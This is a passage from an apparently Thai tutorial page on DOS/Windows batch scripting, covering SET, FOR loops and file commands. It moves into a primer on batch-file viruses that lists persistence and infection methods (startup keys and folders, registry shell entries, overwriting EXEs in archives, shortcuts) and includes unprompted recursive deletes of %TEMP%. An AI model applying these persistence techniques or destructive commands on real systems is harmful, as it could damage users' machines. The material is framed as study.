ไมโครซอฟต์ว่ามันขยายออกไปเท่าไหร่) ถึงแม้ CMD.EXE มีพารามิเตอร์เพิ่มคำสั่ง Environment ออกไปแต่การเซ็ตค่าดัง กล่าวต้องกระทำบนรีจีสตรีถึงจะเป็นค่า (Default; ดีฟอลต์ ค่าพื้นฐาน) ตัวผู้เขียนก็ยังไม่ทราบข้อมูลอีกเช่นกันว่าเซ็ตที่คีย์อะไร...จึงขออภัยมา ณ ที่นี้
แล้วอะไรคือตัวแปร Environment
	ตัวแปรเอนวิรอนเมนต์บนแบตช์ไฟล์นั้น จะมีคำสั่ง %...% เปิดและปิดท้ายเมื่อมีการอ้างถึง...ซึ่งผู้เขียนยกตัวอย่างแบบก้าวกระโดดมาตั้งแต่ ภาคแรกๆ แล้ว...และทิ้งความสงสัยไว้ให้ผู้อ่าน...หลายๆ อย่าง...แต่ขอให้รู้ว่า อะไรก็ตามที่มี % อยู่ด้านหน้า หมายถึงตัวแปร และถ้ามีปิด ท้ายด้วย คือ %ตัวแปรเอนวิรอนเมนต์% แต่ถ้าไม่มีปิดท้าย...จะหมายถึงตัวแปรที่ถูกใช้งานในคำสั่งของ DOS เช่น For หรือ แม้แต่ พารามิเตอร์และอาร์กิวเมนต์ของ DOS ด้วย
การนิยามตัวแปรเอนวิรอนเมนต์

คำสั่ง
SET CHARACTOR=ABCDE ; หมายถึงกำหนดตัวแปร CHARACTOR เอนวิรอนเมนต์เป็นตัวอักษร ABCDE

คำสั่ง
SET /A NUMBER=1234 ; หมายถึงกำหนดตัวแปร NUMBER เป็นตัวเลข หนึ่งพันสองร้อยสามสิบสี่

คำสั่ง
SET NUMBER= ; หมายถึงลบตัวแปร NUMBER ออกจากหน่วยความจำ
การเรียกใช้งานให้ เปิดด้วย % และปิดด้วย % อีกที
มาดูคำสั่ง SET ว่าทำงานกับตัวแปรเอนวิรอนเมนต์ยังไง
มาดูว่า DOS สามารถคำนวนอะไรได้บ้าง
() - คำสั่ง Grouping
! ~ - - unary operators
* / % + - - คำสั่ง คำนวน
&lt;&lt; &gt;&gt; - คำสั่งเลื่อน (โอ...คำสั่งนี้จะเลื่อนบิตได้เหมือน C หรือเปล่าต้องลองดู)
& ^ | - คำสั่งทางตรรกะก็มี
= *= /= %= += -= - คำสั่งคำนวนและเก็บตัวแปร...(เหมือนภาษา C)
&= ^= |= &lt;&lt;= &gt;&gt;=
, - expression separator

คำสั่ง
SET /A TEST=((5+4-3)*2)/1) ; คำนวนเก็บไว้ในตัวแปร TEST
MSG %USERNAME% %TEST% ; แสดงผลการคำนวน
SET TEST= ; ล้างตัวแปร TEST ออกจากหน่วยความจำ
*** ผลที่ได้คือ 12

คำสั่ง
SET /A TEST=0 ; กำหนดให้ TEST เริ่มที่ 0
SET /A TEST+=1 ; กำหนดให้ TEST เพิ่มที่ละ 1
MSG %USERNAME% %TEST% ; แสดงผลการคำนวน
SET TEST= ; ล้างตัวแปร
*** ผลที่ได้คือ 1

	จากตัวอย่างด้านบนคำสั่ง += สามารถใช้กับ -=, *= และ /= ได้ด้วยการโอเปเรชั่นเบื่องลึกนั้น...ขอเสนอในภาษา VB6 จะดีกว่า...รู้ไว้เพียงว่าในแบตช์ไฟล์เองสามารถทำงานแบบที่ภาษาระดับสูงกว่าทำได้เช่นกัน...ถ้ามีการเรียกตัวแปรเอนวิรอนเมนต์ในแบตช์ไฟล์ แต่ยังไม่มีการเซ็ตตัวแปรนั้น แบตช์ไฟล์จะข้ามคำสั่งนั้นไปเหมือนไม่มีอะไรเกิดขึ้น

คำสั่ง
%TEST% MSG %USERNAME% "แสดงข้อความปกติ"; ไม่พบตัวแปรจะข้ามคำสั่ง %TEST% และแสดงข้อความทันที

คำสั่ง
SET TEST=REM ; กำหนดให้ตัวแปร TEST เป็นคำสั่ง REM
%TEST% MSG %USERNAME% "ไม่สามารถแสดงข้อความนี้ได้" ; กล่องข้อความไม่สามารถแสดงได้เพราะตัวแปร TEST เป็นคำสั่ง REM หรือ Remark หรือหมายเหตุในแบตช์ไฟล์
SET TEST= ; ลบตัวแปร TEST
หรือบางทีสามารถกำหนดคำสั่งไว้ในตัวแปรเอนวิรอนเมนต์และเรียกมันทำงานพร้อมกันดังนี้
SET CMD1=MSG ; กำหนดตัวแปร CMD1 เป็นคำสั่ง MSG
SET MSG1="Hello World" ; กำหนดข้อความใน CMD1
%CMD1% %USERNAME% %MSG1% ; นำตัวแปรทั้งหมดมาเขียนเป็น

คำสั่ง
SET CMD1= ; ลบ CMD1
SET MSG1= ; ลบ MSG1
ในคำสั่ง SET /P [ตัวแปร]=[ข้อความ]{วรรค}
คำสั่ง SET /P มีประโยชน์อย่างมากในการติดผู้ใช้งานกับแบตช์ไฟล์เพราะมันเป็นการรอให้พิมพ์ข้อความอะไรลงไปยัง Prompt รับคำสั่งและ Enter จากนั้นแบตช์ไฟล์จะประมวลผลอีกที

คำสั่ง
@Echo 1. Menu1 ; แสดงข้อความที่คอนโซล
@Echo 2. Menu2 ; แสดงข้อความที่คอนโซล
@Echo 3. Menu3 ; แสดงข้อความที่คอนโซล
@SET /P M=Menu ; รับข้อความ Enter
@IF %M%==1 MSG %USERNAME% "Is Type Menu1" ; แสดงเมนูที่เลือก
@IF %M%==2 MSG %USERNAME% "Is Type Menu2" ; แสดงเมนูที่เลือก
@IF %M%==3 MSG %USERNAME% "Is Type Menu3" ; แสดงเมนูที่เลือก

การดึงข้อความจากตัวแปรเอนวิรอนเมนต์
%ตัวแปร:~ตัวที่,จำนวนอักษร%
%ตัวแปร:~ตัวที่%
%ตัวแปร:~ตัวที่,-จำนวนอักษรจากหลัง%

คำสั่ง
SET STR=ABCDEFGHIJKLMNOPQRSTUVWXYZ ; กำหนดตัวแปร STR มีข้อความ A ถึง Z
MSG %USERNAME% %STR:~0,5% ; ดึงข้อความจากตัวแปร STR ตัวที่ 0 มา 5 ตัว (ABCDEF)
MSG %USERNAME% %STR:~4,1% ; ดึงข้อความจากตัวแปร STR ตัวที่ 4 มา 1 ตัว (E)
MSG %USERNAME% %STR:~1% ; ดึงข้อความจากตัวแปร STR ตัวที่ 1 มาทั้งหมด (BCDEFGHIJKLMNOPQRSTUVWXYZ)
MSG %USERNAME% %STR:~1,-2% ; ดึงข้อความจากตัวแปร STR ตัวที่ 1 จากหน้ามาท้าย -2 ตัว (BCDEFGHIJKLMNOPQRSTUVWX)
SET STR= ; ลบตัวแปร

ตัวแปรอรรถประโยชฺ์ของ Environment
	ตัวแปรเอนวิรอนเมนต์ด้านบนเป็นตัวแปรที่ถูกกำหนดโดยอัตโนมัติที่สามารถเรียกใช้ได้โดยไม่ต้องมีการเซ็ตตัวแปรเพราะระบบจะเซ็ตให้อัตโนมัติเมื่อเรียกใช้งานเช่น

คำสั่ง
MSG %USERNAME% ไดร์ฟซีดีรอมคือ %CD% ; แสดงสาระบบที่ทำงานอยู่

คำสั่ง
MSG %USERNAME% วันที่ปัจจุบัน %DATE% ; แสดงวันที่ปัจจุบัน

คำสั่ง
MSG %USERNAME% เวลาปัจจุบัน %TIME% ; แสดงเวลาปัจจุบัน

คำสั่ง
MSG %USERNAME% สุมเลข %RANDOM% ; แสดงเลขที่สุ่ม

คำสั่ง
MSG %USERNAME% เลขผิดพลาดหมายเลข %ERRORLEVEL% ; แสดงหมายเลขผิดพลาด

คำสั่ง
MSG %USERNAME% หมายเลข CMDEXTVERSION %CMDEXTVERSION% ; แสดงเวอร์ชั่น CMD

คำสั่ง
MSG %USERNAME% คำสั่งที่ทำงานอยู่ %CMDCMDLINE% ; แสดงคำสั่งที่ทำงานอยู่ปัจจุบัน

เกี่ยวกับการจัดการโครงสร้างไดเร็กทอรี่หรือโฟลเดอร์
	คำว่า "Diretory" มีมาพร้อมระบบปฏิบัติการ DOS มันคืออะไรนะเหรอ...มันก็คือโฟลเดอร์ที่แท้จริงของระบบปฏิบัติการ DOS ซึ่งปัจจุบันเราใช้คำว่า "Folder" แทนเสียแล้ว DIR เป็นคำสั่งที่แสดงข้อมูลที่อยู่ภายในไดเร็กทอรี่รวมถึง "แฟ้มข้อมูล;Files"

MD [ชื่อไดเร็กทอรี่]

หรือ

MKDIR [ชื่อไดเร็กทอรี่]

	เลือกเอาเอง...จะพิมพ์สั้นๆ หรือจะพิมพ์แบบเต็มๆ คำสั่งนี้คือคำสั่งสร้างไดเร็กทอรี่หรือโฟลเดอร์ขึ้นมาบน DOS และยังคงอยู่บนวินโดวส์ด้วยเช่นกันไม่ว่าจะไช้งาน "ไฟล์อโลเคชั่น; FAT" ประเภทได้ก็ตาม

คำสั่ง
MD "New Folder" ; สร้างโฟลเดอร์ New Folder (ต้องใส่เครื่องหมายคำพูดสำหรับชื่อที่มีการเว้นวรรค) เพื่อคำสั่งไม่ผิดพลาด

CD [ชื่อไดเร็กทอรี่]

หรือ

CHDIR [ชื่อไรเร็กทอรี่]

	คำสั่งนี้...เช่นกันเลือกเอา...จะพิมพ์สั้นๆ หรือยาวๆ มีหน้าที่ในการกระโดดเข้าไปยังไดเร็กทอรี่ลูกๆ (Sub Folder) หรือซับโฟลเดอร์ที่อยู่ภายในโฟลเดอร์นั้นๆ โดยสามารถจะพิมพ์เพียง สั้นๆ ด้วย "White Card; *, ?" ได้ดั้งนี้

คำสั่ง
CD W* ; หมายถึงเข้าไปยังโฟลเดอร์ที่มีอักษร W นำหน้าโดยเรียงความสำคัญตามลำดับตัวอักษรต
CD Windows ; เพื่อเข้าสู่โฟลเดอร์ Windows
CD "New Folder" ; เพื่อเข้าสู่โฟลเดอร์ New Folder (ต้องมีเครื่องหมายคำพูดสำหรับชื่อที่มีการเว้นวรรค)

RD /S /Q [ชื่ไดเร็กทอรี่]

หรือ

RMDIR [/S] [/Q] [ชื่อไดรเร็กทอรี่]
/S ลบทุกซับโฟลเดอร์ลูกๆ
/Q ลบโดยไม่ต้องถามยืนยัน

คำสั่ง
RD /S /Q %TEMP% ; คือการลบข้อมูลในโฟลเดอร์ที่อยู่ในตัวแปร TEMP ได้แก่ C:\Users\ADMINI~1\AppData\Local\Temp หรือที่อยู่อื่นๆ โดยลบทั้งซับโฟลเดอร์และตัวมัน...โดยไม่ต้องถาม

คำสั่ง
RD /S "New Folder" ; คือการลบแฟ้ม New Folder รวมถึงซับโฟลเดอร์ที่อยู่ด้านใน...โดยถามที่ละโฟลเดอร์

และเราจะรู้ได้ยังไง...อะไรควรลบ...อะไรไม่ควรลบ...คำตอบอยู่ที่คำสั่งนี้...ให้ลองพิมพ์

TREE /F /A [ชื่อไดเร็กทอรี่] 
/F แสดงชื่อแฟ้มในไดเร็กทอรี่ด้วย
/A แสดงเส้นทางโดยใช้อักษรชี้ทาง 

คำสั่ง
TREE \Users /F /A ; คือแสดงแฟ้มข้อมูลและโครงสร้างไดเร็กทอรี่ทั้งหมดภายในโฟลเดอร์ Users ด้วยสัญลักษณ์
TREE \Users ; คือแสดงโครงสร้างไดเร็กทอรี่ทั้งหมดภายในโฟลเดอร์ Users ไม่มีสัญลักษณ์นำทาง
TREE \Users /F ; คือแสดงแฟ้มข้อมูลและโครงสร้างไดเร็กทอรี่ทั้งหมดภายในโฟลเดอร์ Users ไม่มีสัญลักษณ์นำทาง

	มาถึงการแสดงข้อมูลภายใน DIR ที่เก่าแก่...ที่สุด...รวมถึงมีลูกเล่นมากที่สุด...ในบรรดาคำสั่งของ DOS ทั้งหมด คำสั่ง"ดีไออาร์" (อย่าพิมพ์เล่นๆ เหมือนละครบางเรื่อง...แฮเกอร์พิมพ์เป็นแค่ DIR เดียวใครเขาจะว่าเอา)ผู้เขียนจะยกตัวอย่างคำสั่งที่จำเป็นบางตัว...ไม่เจาะจงไปทั้งหมด...เพราะจะทำให้บทนี้...มันอาจกลายเป็น "คัมภีร์ DIR" ได้มันเยอะมาก...รายละเอียดปลีกย่อย

คำสั่ง
DIR /S ; คือการแสดงแฟ้มข้อมูลและซับโฟลเดอร์ทั้งหมด

คำสั่ง
DIR /Q ; คำสั่งแสดงสิทธิ์การใช้งานของโฟลเดอร์นั้นๆ ว่าเป็นใครบ้าง

คำสั่ง
DIR /B ; คือคำสั่งแสดงเฉพาะที่อยู่แฟ้มและชื่อแฟ้มอย่างเดียว...รายละเอียดอื่นๆ ไม่เอา

คำสั่ง
DIR /AD ; คือการแสดงเฉพาะโฟลเดอร์เท่านั้น
DIR /ARSH ; คือคำสั่งแสดง แฟ้มแบบอ่านอย่างเดียว, แฟ้มระบบ และ แฟ้มแบบซ่อน
DIR /AA ; คือการแสดงแฟ้มที่ถูกระบบจัดการเรียบเรียงหรือบีบอัดไว้แล้ว
DIR /AL ; คือคำสั่งแสดง Junktion ของระบบ (ในคำสั่งนี้มีเฉพาะ Windows 7 ขึ้นไป..ซึ่งผู้เขียนยังไม่ทราบแน่ชัดว่า...Junktion นี้ทำงานอย่างไร....เพราะ เอกสารของมันมีน้อยมาก) หรือใส่ "-" ถ้าไม่ต้องการเงื่อนไขนั้น...

คำสั่ง
DIR /TC ; แสดงวันที่สร้างแฟ้มหรือโฟลเดอร์ล่าสุด
DIR /TA ; แสดงวันที่เข้าถึงแฟ้มหรือโฟลเดอร์ล่าสุด
DIR /TW ; แสดงวันที่เขียนแฟ้มหรือโฟลเดอร์ล่าสุด
ต่อมาการเรียงลำดับ

คำสั่ง
DIR /ON ; แสดงแฟ้มและโฟลเดอร์เรียงตามชื่อ
DIR /OS ; แสดงแฟ้มและโฟลเดอร์เรียงตามขนาดแฟ้ม
DIR /OE ; แสดงแฟ้มและโฟลเดอร์เรียงตามนามสกุล
DIR /OD ; แสดงแฟ้มและโฟลเดอร์เรียงตามวันที่
DIR /OG ; แสดงแฟ้มและโฟลเดอร์เรียงโดยโฟลเดอร์ขึ้นก่อน

คำสั่งจัดการไฟล์ข้อมูล
	คำสั่งคัดลอกและเคลื่อนย้ายแฟ้มข้อมูลนั้นสำคัญมากสำหรับช่างซ่อมคอมหรือโปรแกรมเมอร์ที่จะสำรองหรือเคลื่อนย้ายแฟ้มข้อมูลเก็บไว้ ...

คำสั่งคัดลอกแฟ้ม (ที่ละโฟลเดอร์)
มาดูการทำงานของคำสั่ง COPY

COPY /Y FILE1.TXT FILE1.TXT ; คัดลอก FILE1.TXT ไปที่ FILE1.TXT โดยไม่ต้องถาม
COPY /Y FILE1.TXT NEWNAME.TXT ; คัดลอก FILE1.TXT ไปที่ NEWNAME.TXT โดยไม่ต้องถาม
COPY /-Y FILE1.TXT NEWNAME.TXT ; คัดลอก FILE1.TXT ไปที่ NEWNAME.TXT และถาม
COPY FILE1.TXT+FILE2.TXT NEWFILE.TXT ; คัดลอก FILE1.TXT รวมเข้ากับ FILE2.TXT ไปที่ NEWFILE.TXT

คำสั่งลบแฟ้มและโฟลเดอร์
	คำสั่งลบแฟ้มของ DOS ยุคใหม่...สามารถทำงานได้ครบทั้งลบแฟ้มข้อมูลรวมถึงโฟลเดอร์เอกสารได้ด้วยทำให้คำสั่งภายในที่ชื่อ DELTREE.EXE สูญพันธ์ในทันที

คำสั่ง
DEL /S "New Folder" ; ลบโฟลเดอร์ New Folder รวมทั้งซับโฟลเดอร์ทั้งหมด
DEL /P "New Folder" ; ลบโฟลเดอร์ New Folder และถามยืนยันการลบ (จะเกิดข้อผิดพลาดถ้ามี ซับโฟลเดอร์)
DEL /F "New Folder" ; ลบโฟลเดอร์ New Folder ไม่ถามยืนยันการลบ (จะเกิดข้อผิดพลาดถ้ามี ซับโฟลเดอร์)
DEL /S /F %TEMP% ; ลบโฟลเดอร์ในตัวแปร TEMP โดยไม่ถามและลบซับโฟลเดอร์ด้วย
คำสั่ง
DEL /ARSH /S /P %TEMP% ; ลบโฟลเดอร์ในตัวแปร TEMP โดยไม่ถามและลบซับโฟลเดอร์ด้วยเฉพาะแฟ้มที่มีคุณลักษณะ อ่านอย่างเดียวเป็นแฟ้มระบบและซ่อนอยู่

คำสั่งคัดลอกแฟ้มข้อมูลทั้งโฟลเดอร์

คำสั่ง
XCOPY /Y C:\Users\Administrator\Documents\*.* D:\BackUp ; คัดลอกแฟ้มทั้งโฟลเดอร์ C:\Users\Administrator\Documents\ ทุกไฟล์โดยไม่ต้องถาม ไปที่ D:\BackUp

คำสั่งเคลื่อนย้ายทั้งโฟลเดอร์

คำสั่ง
MOVE /Y C:\Users\Administrator\Documents\*.* D:\BackUp ; เคลื่อนย้ายแฟ้มทั้งโฟลเดอร์ C:\Users\Administrator\Documents\ ทุกไฟล์โดยไม่ต้องถาม ไปที่ D:\BackUp
รายละเอียดปลีกย่อย...อื่นๆ...ผู้เขียนยังไม่มีความชำนาญมากเกี่ยวกับรูปแบบคำสั่งแต่ละคำสั่ง...อื่นๆเพราะยังไม่เคยมีความจำเป็นต้องเรียกใช้เลยไม่ได้ศึกษาเชิงลึกลงไปซักเท่าไหร่ ...ได้แค่เคลื่อนย้ายหรือคัดลอกแบบที่ Explorerทำงานบนวินโดวส์เท่านั้น...ส่วนใครจะประยุกต์ใช้งานเพื่อประโยชน์อันสูงสุด...ก็เชิญแปลภาษาอังกฤษต่อไป...แต่สำหรับมือใหม่... หรือคนที่คิดว่า...สคริปเหล่านี้...ทำงานบนวินโดวส์เร็วกว่า...ก็ถูก...เพียงแต่ผู้เขียนยกตัวอย่างมาเพื่อให้สามารถเขียนแบตช์ไฟล์ในการคัดลอก, ลบและเคลื่อนย้ายข้อมูลผ่านแบตช์ไฟล์ ให้สะดวกยิ่งขึ้นเท่านั้น...

คำสั่งควบคุมแบตช์ไฟล์
มาถึงคำสั่งที่มีความซับซ้อนที่สุดของแบตช์ไฟล์...คำสั่งนั้นคือ FOR
คำสั่ง FOR %ตัวแปร IN (รายการ) DO [คำสั่ง]
คำสั่งนี้...หลักๆ คือการในข้อมูลในรายการหรือลิสต์ มาประมวลผลไปยังคำสั่งด้านหลัง...โดยผ่านตัวแปรของคำสั่ง FOR ซึ่งต้องเป็น "อักษรเท่านั้น" ห้ามเป็น "ตัวเลข"
% นำหน้าตัวเลข คือ พารามิเตอร์ และ อาร์กิวเมนต์ เช่น %1 %2
%% นำหน้าตัวอักษร คือ ตัวแปรในคำสั่ง FOR เช่น %%N
% นำหน้าตัวอักษรและปิดท้าย% คือ ตัวแปรเอนวิรอนเมนต์ที่เคยกล่าวไว้แล้ว เช่น %N%

คำสั่ง
FOR %%D IN (A B C D E F H I J K L M N O P Q R S T U V W X Y Z) DO IF EXIST %%D:\*.* MSG %USERNAME% "พบแฟ้มในไดร์ฟ %%D" ; ลิสต์ชื่อไดร์ฟทั้งหมดและค้นหาว่าพบแฟ้มที่รูทโฟลเดอร์ของไดร์ฟนั้นหรือไม่ไปยังกล่องข้อความ

คำสั่ง
FOR %%N IN (0 1 2 3 4 5 6 7 8 9) DO MSG %USERNAME% %%N ; แสดงตัวเลข 0 ถึง 9 ในกล่องข้อความ

คำสั่ง
FOR /D %%V IN (D:\*.*) DO MSG %USERNAME% %%V ; แสดงชื่อโฟลเดอร์ที่ D:\ ทั้งหมดในกล่องข้อความ
FOR /R D:\ %%F IN (*.MP3) DO ECHO %%F ; แสดงชื่อนามสกุล MP3 ทั้งหมดใน D:\ ที่คอนโซล

คำสั่ง
FOR /L %%N IN (1,1,10) DO MSG %USERNAME% %%N ; แสดงเลข 1 ถึง 10 ในกล่องข้อความ
FOR /L %%N IN (10,-1,1) DO MSG %USERNAME% %%N ; แสดงเลข 10 ถึง 1 ในกล่องข้อความ

	ส่วนคำสั่ง FOR /F นั้น...ใครเข้าใจถือว่า..."เทพ" มาก...ผู้เขียนจะยังไม่ยกตัวอย่างในตอนนี้...เพราะมันมีความยาก อย่างมากสำหรับผู้เริ่มต้นเขียนโปรแกรม ซึ่งยกตัวอย่างการเขียน หรืออ่านแฟ้มใน VB6 จะง่ายกว่ามาก...ไม่ต้องศึกษากฎของแบตช์ไฟล์มากนัก เพราะใครเขียน FOR /F เป็นแล้ว...คงเป็นระดับโปรแกรมเมอร์...ที่เก่งกาจทีเดียว...เนื้อหาที่โพสต์มา 8 ภาค...แทบจะไม่มีความหมายสำหรับพวกเขา...

					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu11'>
08.02. เริ่มทำความเข้าใจไวรัสแบบใกล้ตัวมากขึ้น
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	ไวรัสต้องอาศัยโฮสต์หรือพาหะ...ฉนั้นต้องทำความเข้าใจก่อนว่า...แฟ้มอะไรบ้างบนวินโดวส์ที่สามารถเขียนสคริปได้
	1 .VBS, .JS, .VBE, .JSE, .BAT, .CMD, และสคริปพาเวอร์เชลล์ในอนาคต รวมถึงสคริปที่ยังไม่กล่าวถึงอีกมาก...ที่สามารถทำงานได้โดยการ Open หรือ ดับเบิ้ลคลิก
	2 แฟ้มคำสั่ง และ Link คำสั่ง รวมถึง Junction ในอนาคต แฟ้มเหล่านี้ระบบปฏิบัติการสร้างขึ้นให้เรียกใช้งานได้ทันทีหรือดับเบิ้ลคลิก หรือ Open หรือ Shell อื่นๆ แบบอัตโนมัติ ไวรัสสามารถสิ่งสถิตย์ได้หมด
	3 เอกสารที่มีการเรียก Hyperlink และ Macro ติดไวรัสได้หมดเช่นกัน เช่น .HTM, .DOC, .XLS, .PDF .CDR และเอกสารของ มาโครมิเดียเช่นกัน
	มีแฟ้มไม่กี่ประเภทที่ไม่มีไวรัส...เช่น ภาพ...เพลง...แอคไควบีบอัดทั้งหลาย...วีดีโอบางไฟล์อาจมีลิงค์ที่เรียกไวรัสจากอินเตอร์เน็ตได้...ที่ผ่านมาผู้เขียนยังเคยพบ ไวรัสที่ฝากตัวเองไว้ใน .RAR ก็มี...ด้วยการอาศัยการเรียกคำสั่ง shell บน DOS เปิดแฟ้มติดเชื้อและเขียนตัวเองทับแฟ้ม .EXE ในนั้น มันทำได้ จึงสรุปได้ว่า แฟ้มที่เป็นข้อความเช่น .TXT, .MP3, .JPG, ,BMP, .PNG, .ICO อีกมากมาย...ที่เขียนโปรแกรมใส่ไปในแฟ้มเหล่านั้นไม่ได้...มันจะไม่ติดไวรัสนั้นเอง

สำหรับแบตช์ไฟล์ไวรัส...มีกี่ประเภท
	1. มีหัวเป็น rem{วรรค}ตามด้วยโค้ดไวรัส Binary Virus&gt;แฟ้มไวรัส.COM
	2. @echo{วรรค}ตามด้วยโค้ด Binary Virus &gt;แฟ้มไวรัส.COM
	3. อาศัย Debug.EXE รันไวรัสและหลบซ่อน
	4. อาศัยตัวเองใน AutoExec.NT และรอแพร่เชื้อ
	5. อาศัยใน StartUp Key
	6. อาศัยใน StartUp Folder
	7. อาศัยใน Shell หรือ ActiveX ใน Registry
	8. อาศัยตัวมันเองแพร่เชื้อและติดเชื้อโดยตรง
	9. เขียนทับแฟ้ม .EXE ใน .ZIP หรือ .RAR
	10. ทำงานผ่าน .LNK หรือ ช็อตคัท...หรือ Hyperlink ต่างๆ
	11. คาดว่าในอนาคต...ถ้าหาทางเจาะ...เมโทรยูไอ หรือหน้าจอมือถือได้...ไวรัสรวมถึงแบตช์ไฟล์ไวรัสจะกลับมาระบาดอีกครั้ง...

การทดสอบไวรัส...และเข้าถึงว่ามันคืออะไรทำงานอย่างไร...?
	กรณีศึกษาเพื่อทำความเข้าใจเกี่ยวกับคำสั่งไวรัส เจาะลึก DOS Batch File (ปูพื้นฐานการศึกษามัลแวร์) Batch File คืออะไร...มันคือชุดคำสั่งที่รวบรวมคำสั่งบน Command Line (หรือคำสั่งบน หน้าต่าง Cmd ของ วินโดวส์ XP) ซึ่งในอดีต...DOS สร้างขึ้นมาเพื่อเป็นเมนูลัดบนระบบปฏิบัติการรุ่นโบราณที่ทำงานอยู่บน "คอนโซล(แป้นพิมพ์และจอภาพ)" เช่นการ CD DOS คือการเข้าไปยัง Directory DOS หากจะพิมพ์ข้อความเหล่านั้นทั้งหมด...บ่อยๆ ครั้ง จะทำให้เสียเวลา DOS จึงให้สามารถนำคำสั่งที่ใช้บ่อยๆ มาบันทึกเป็นแฟ้มข้อความที่มีนามสกุล .BAT เพื่อให้สามารถพิมพ์ชื่อแฟ้ม .BAT นั้นและตามด้วย Enter ก็สามารถเรียกใช้คำสั่งทั้งหมดในนั้นได้คำสั่งเพียงคำสั่งเดียวคุณเองจำมันได้ จะกลายเป็นเส้นทางลัดและคำสั่งแบบซับซ้อนซึ่งตัวของ Batch File เองสามารถทำงานอะไรได้บ้าง...โอย...มันทำงานได้มากจนคุณเองคาดไม่ถึงเลย...ตั้งแต่การล็อกระบบ, ตรวจสอบข้อมูล Error หรือ, เขียนไวรัส...(อันสุดท้ายนี้ไม่ค่อยชอบนะแต่คุ้นเคย) และผู้อ่านที่บางคนไม่เคยแตะ...DOS มาก่อนจะศึกษาได้หรือเปล่า...ได้ครับ...แต่ต้องมีพื้นฐานต้องหาอ่านกันหน่อย ในหนังสือเล่มนี้จะอธิบายเฉพาะคำสั่งที่สำคัญๆ เท่านั้น...เพราะเกรงว่าถ้าอธิบายทุกๆ คำสั่งของ DOS เนื้อหาของหนังสือจะไม่พอครับ...

เอาล่ะ...ปูพื้นกันใหม่ด้วย DOS บนวินโดวส์เอ็กซ์พี...
	 DOS ที่ทำงานบนวินโดวส์ 32 บิต มันจะขยายการทำงานของ Environment Memory ที่คุณใช้กำหนดตัวแปรด้วยคำสั่ง SET และมันก็ทำงานร่วมกับชื่อแฟ้มข้อมูลที่มีขนาดยาวๆ ได้สบาย รวมถึงบรรจุคำสั่งภายใน (Internal Command) เอาไว้ในระบบวินโดวส์ ครับ...เป็นผลให้ตำรา DOS ที่คุณเคยเปิดอ่าน...เก็บมันใส่ลังได้เลยเพราะคำสั่งใหม่ๆ เพิ่มเข้ามาเพียบ...ผมเองก็นำมาสอนได้ไม่ทุกคำสั่งครับ...แต่มีรายชื่อคำสั่งภายใน (Internal Command) ให้คุณดูเล่นๆ ดังนี้ ASSOC, AT, ATTRIB, BREAK, CACLS, CALL, CD, CHCP, CHDIR, CHKDSK,CHKNTFS, CLS, CMD, COLOR, COMP, COMPACT, CONVERT, COPY, DATE,DEL, DIR, DISKCOMP, DISKCOPY, DOSKEY, ECHO, ENDLOCAL, ERASE,EXIT, FC, FIND, FINDSTR, FOR, FORMAT, FTYPE, GOTO, GRAFTABL,HELP, IF, LABEL, MD, MKDIR, MODE, MORE, MOVE, PATH, PAUSE, POPD, PRINT, PROMPT, PUSHD, RD, RECOVER, REM, REN, RENAME, REPLACE,RMDIR, SET, SETLOCAL, SHIFT, SORT, START, SUBST, TIME, TITLE, TREE, TYPE, VER, VERIFY, VOL, XCOPY นี้คือคำสั่งที่สามารถทำงานได้ทุกเวลาที่ วินโดวส์ทำงานครับ ไม่เหมือนกับ (External Command) เช่น EDIT.EXE, FDISK.EXE ซึ่งไวรัสเองสามารถลบแฟ้มคำสั่งเหล่านั้นทิ้ง ส่งผลให้ใช้คำสั่งนั้นไม่ได้ ตัวอย่างคือถ้าไวรัสลบแฟ้ม REG.EXE ทิ้งไปซะ จะทำให้ไม่สามารถแก้ไขระบบรีจีสตรีย์ ของวินโดวส์ได้ใน DOS Command และถ้าไวรัสลบแฟ้ม REGEDIT.EXE, REGEDIT32.EXE ทิ้งไปอีก ก็ไม่สามารถเข้ารีจีสตรีย์ ในวินโดวส์ได้เลย ทำให้การฆ่าไวรัสยากขึ้นอีกมาก อย่างไรก็ดี คุณรู้แล้วควรสำรองแฟ้มเหล่านี้เก็บเอาไว้เพื่อไม่ให้ถูกเล่นงานจากไวรัสแบบเซียน

คำสั่งบน DOS นั้น ประกอบด้วย...
[คำสั้งDOS]วรรค[/ พารามิเตอร์]วรรค[ที่อยู่แฟ้มข้อมูลหรือโฟลเดอร์]
เช่น
 
DIR /AS C:WINDOWS

หรือ
[คำสั่งDOS]วรรค[+- พารามิเตอร์]วรรค[ที่อยู่แฟ้มข้อมูลหรือโฟลเดอร์]
เช่น

 ATTRIB +R +H +S C:AUTOEXEC.BAT

หรือ
[คำสั่งDOS]วรรค[คำสั่งย่อย]วรรค[ที่อยู่แฟ้มข้อมูลหรือโฟลเดอร์]
เช่น 

REG QUERY HKLM\SYSTEM

หรือจะดูรูปแบบคำสั่งในตัวช่วย
[คำสั่งDOS] /?
เช่น COPY /?
หรือ
[คำสั่งDOS]วรรค[คำสั่งย่อย] /?
เช่น 

REG QUERY /?

คำสั่งเชื่อมต่อ หรือ "ไปป์ปิ้ง ; Piping" และ "ไดเรกชั่น; Direction"
	และคำสั่งที่จะอ้างถึงอุปกรณ์เหล่านั้นเราเรียก "ท่อ Pipe" หรือคำสั่ง "ไปป์ปิ้ง" มีอยู่ 5 คำสั่งคือ
	1. | "เชื่อมต่อ" คำสั่งนี้เป็นคำสั่งไปป์ตัวจริงใช้เชื่อมคำสั่ง DOS 2 คำสั่งให้ทำงานพร้อมกัน 2 คำสั่งอย่างมากเท่าที่ทำงานมา) แต่คำสั่งนี้ทำงานได้ตั้งแต่ DOS 5 เป็นต้นมาแต่มีข้อเสียคือถ้าจะใช้คำสั่งนี้...ห้ามใช้กับอุปกรณ์ ROM เช่น CD-ROM กล่าวคือคำสั่งต้องอาศัย Temporary ในการทำงานจึงไม่สามารถทำงานกับอุปกรณ์ที่ป้องกันการเขียนได้
	2. &gt; "ยิงออก" คำสั่งนี้เป็นคำสั่งส่งผลหน้าจอภาพไปยังอุปกรณ์ทั้ง 5
	3. &gt;&gt; "ยิงเพิ่ม" คำสั่งนี้เป็นคำสั่งส่งผลหน้าจอภาพเพิ่มเติมจาก "ยิงออก" ไปยังอุปกรณ์ทั้ง 5
	4. &lt; "รับเข้า" คำสั่งนี้เป็นคำสั่งส่งผลจากคำสั่งด้านหลังเข้ามา
